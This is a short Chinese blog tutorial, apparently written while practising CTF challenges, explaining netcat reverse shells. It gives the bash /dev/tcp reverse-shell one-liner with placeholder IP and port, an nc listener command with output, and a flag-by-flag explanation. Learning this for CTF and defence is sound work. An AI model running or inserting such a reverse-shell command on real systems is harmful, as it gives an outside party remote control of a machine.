title: nc反弹shell
tags:
  - CTF
categories:
  - CTF
cover: /images/pasted-66.png
date: 2020-03-23 21:34:44
---
这几日做CTF，竟然自己不会用反弹shell
今天，赶紧补一下知识

## 什么是反弹shell？
反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

![upload successful](/images/pasted-66.png)

## 使用方法

被控机：
```shell
bash -i >& /dev/tcp/ip/port 0>&1
```

主控机：
```shell
[root@hacker ~]# nc -lvp 6767

Ncat: Version 7.50 ( https://nmap.org/ncat )

Ncat: Listening on :::6767

Ncat: Listening on 0.0.0.0:6767
```

## 原理解释
解释：

```shell
nc -lvp 6767
```
-l 监听，-v 输出交互或出错信息，-p 端口。
nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。

 
```shell
bash -i
```
-i interactive。即产生一个交互式的shell（bash）。

 
```shell
/dev/tcp/IP/PORT
```
特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。
打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。